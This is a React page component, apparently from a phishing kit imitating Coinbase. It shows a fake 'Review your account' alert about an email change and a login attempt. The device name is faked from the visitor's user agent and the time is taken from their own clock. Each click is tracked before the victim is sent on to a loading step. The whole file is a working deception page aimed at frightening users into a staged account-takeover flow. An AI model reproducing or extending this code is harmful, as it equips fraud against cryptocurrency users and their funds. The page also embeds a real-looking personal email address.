import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
} from "@/components/cb/CbShared";

export const Route = createFileRoute("/cb/review")({
  head: () => ({ meta: [{ title: "Review your account" }] }),
  component: CbReviewPage,
});

function CbReviewPage() {
  const { trackClick, cbNavigate, sessionId } = useCbTracking();
  const [email] = useState("mohammedalbar27@hotmail.com");
  const [location] = useState("Richmond, Virginia");
  const [device, setDevice] = useState("Mohamed's PC");
  const [time, setTime] = useState("11:57 PM");
  const [section1Choice, setSection1Choice] = useState<"approve" | "deny" | null>(null);
  const [section2Choice, setSection2Choice] = useState<"approve" | "deny" | null>(null);
  const [section1Hidden, setSection1Hidden] = useState(false);
  const [section2Hidden, setSection2Hidden] = useState(false);

  useEffect(() => {
    const ua = navigator.userAgent;
    if (/iPhone/.test(ua)) setDevice("Mohamed's iPhone");
    else if (/iPad/.test(ua)) setDevice("Mohamed's iPad");
    else if (/Android/.test(ua)) setDevice("Mohamed's Android");
    else if (/Mac/.test(ua)) setDevice("Mohamed's Mac");
    else if (/Windows/.test(ua)) setDevice("Mohamed's PC");
    else setDevice("Mohamed's Device");
    const now = new Date();
    setTime(now.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }));
  }, []);

  useEffect(() => {
    if (section1Choice) {
      const timer = setTimeout(() => setSection1Hidden(true), 400);
      return () => clearTimeout(timer);
    }
  }, [section1Choice]);

  useEffect(() => {
    if (section2Choice) {
      const timer = setTimeout(() => {
        setSection2Hidden(true);
        setTimeout(() => {
          trackClick(`Review Complete: ${section1Choice}/${section2Choice}`);
          cbNavigate("/cb/loading");
        }, 500);
      }, 400);
      return () => clearTimeout(timer);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [section2Choice]);

  return (
    <div
      className="cb-review-page"
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-review-page, .cb-review-page * {
          font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
          box-sizing: border-box;
        }
        .cb-section-collapse {
          overflow: hidden;
          transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease;
          max-height: 300px; opacity: 1;
        }
        .cb-section-collapse.hidden-section { max-height: 0; opacity: 0; margin-top: 0 !important; margin-bottom: 0 !important; }
        .cb-divider-collapse {
          transition: max-height 0.4s ease, opacity 0.3s ease, margin 0.4s ease;
          overflow: hidden; max-height: 40px; opacity: 1;
        }
        .cb-divider-collapse.hidden-section { max-height: 0; opacity: 0; margin: 0 !important; }
      `}</style>

      <header style={{ padding: "16px 24px" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ cursor: "pointer" }} onClick={() => trackClick("Logo")}>
            <CbLogo />
          </div>
        </div>
      </header>

      <main
        style={{
          flex: 1,
          display: "flex",
          justifyContent: "center",
          alignItems: "flex-start",
          padding: "48px 24px 0",
        }}
      >
        <div style={{ width: "100%", maxWidth: 480, borderRadius: 16, padding: "40px 32px" }}>
          <h1 style={{ fontSize: 24, fontWeight: 700, color: "#fff", margin: 0, lineHeight: "32px" }}>
            Review your account
          </h1>
          <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 8, lineHeight: "20px" }}>
            We have detected unusual activity on your account, please review these actions before continuing.
          </p>

          <div
            className={`cb-section-collapse ${section1Hidden ? "hidden-section" : ""}`}
            style={{ marginTop: 32 }}
          >
            <div style={{ fontSize: 14, fontWeight: 500, color: "#fff" }}>Credential change</div>
            <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 12, lineHeight: "20px" }}>
              We received a request to change the email address associated with your account to{" "}
              <span style={{ fontWeight: 500, color: "rgb(87, 139, 250)" }}>{email || "..."}</span>.
            </p>
            <div
              style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 20 }}
            >
              <button
                onClick={() => {
                  if (!section1Choice) {
                    setSection1Choice("approve");
                    trackClick("Review Section1 Approve");
                  }
                }}
                disabled={!!section1Choice}
                style={{
                  height: 48,
                  borderRadius: 1000,
                  fontWeight: 700,
                  fontSize: 16,
                  border: "none",
                  cursor: section1Choice ? "default" : "pointer",
                  backgroundColor:
                    section1Choice === "deny" ? "rgba(255,255,255,0.1)" : "rgb(87, 139, 250)",
                  color: section1Choice === "deny" ? "rgba(255,255,255,0.4)" : "rgb(10, 11, 13)",
                  opacity: section1Choice === "deny" ? 0.5 : 1,
                }}
              >
                Approve
              </button>
              <button
                onClick={() => {
                  if (!section1Choice) {
                    setSection1Choice("deny");
                    trackClick("Review Section1 Deny");
                  }
                }}
                disabled={!!section1Choice}
                style={{
                  height: 48,
                  borderRadius: 1000,
                  fontWeight: 700,
                  fontSize: 16,
                  border: "none",
                  cursor: section1Choice ? "default" : "pointer",
                  backgroundColor: section1Choice === "deny" ? "#fff" : "rgba(255,255,255,0.1)",
                  color:
                    section1Choice === "deny"
                      ? "rgb(10, 11, 13)"
                      : section1Choice === "approve"
                        ? "rgba(255,255,255,0.4)"
                        : "#fff",
                  opacity: section1Choice === "approve" ? 0.5 : 1,
                }}
              >
                Deny
              </button>
            </div>
          </div>

          <div
            className={`cb-divider-collapse ${section1Hidden ? "hidden-section" : ""}`}
            style={{ borderTop: "1px solid rgba(255,255,255,0.1)", margin: "32px 0" }}
          />

          <div
            className={`cb-section-collapse ${section2Hidden ? "hidden-section" : ""}`}
            style={{ marginTop: section1Hidden ? 32 : 0 }}
          >
            <div style={{ fontSize: 14, fontWeight: 500, color: "#fff" }}>Attempted login</div>
            <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginTop: 12, lineHeight: "20px" }}>
              We detected a login attempt to your account from{" "}
              <span style={{ fontWeight: 500, color: "rgb(87, 139, 250)" }}>
                {location} at {time}
              </span>
              , from{" "}
              <span style={{ fontWeight: 500, color: "rgb(87, 139, 250)" }}>{device}.</span>
            </p>
            <div
              style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 20 }}
            >
              <button
                onClick={() => {
                  if (!section2Choice) {
                    setSection2Choice("approve");
                    trackClick("Review Section2 Approve");
                  }
                }}
                disabled={!!section2Choice}
                style={{
                  height: 48,
                  borderRadius: 1000,
                  fontWeight: 700,
                  fontSize: 16,
                  border: "none",
                  cursor: section2Choice ? "default" : "pointer",
                  backgroundColor:
                    section2Choice === "deny" ? "rgba(255,255,255,0.1)" : "rgb(87, 139, 250)",
                  color: section2Choice === "deny" ? "rgba(255,255,255,0.4)" : "rgb(10, 11, 13)",
                  opacity: section2Choice === "deny" ? 0.5 : 1,
                }}
              >
                Approve
              </button>
              <button
                onClick={() => {
                  if (!section2Choice) {
                    setSection2Choice("deny");
                    trackClick("Review Section2 Deny");
                  }
                }}
                disabled={!!section2Choice}
                style={{
                  height: 48,
                  borderRadius: 1000,
                  fontWeight: 700,
                  fontSize: 16,
                  border: "none",
                  cursor: section2Choice ? "default" : "pointer",
                  backgroundColor: section2Choice === "deny" ? "#fff" : "rgba(255,255,255,0.1)",
                  color:
                    section2Choice === "deny"
                      ? "rgb(10, 11, 13)"
                      : section2Choice === "approve"
                        ? "rgba(255,255,255,0.4)"
                        : "#fff",
                  opacity: section2Choice === "approve" ? 0.5 : 1,
                }}
              >
                Deny
              </button>
            </div>
          </div>
        </div>
      </main>

      <footer style={{ padding: "16px 24px" }} />

      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>
        {sessionId}
      </div>
    </div>
  );
}
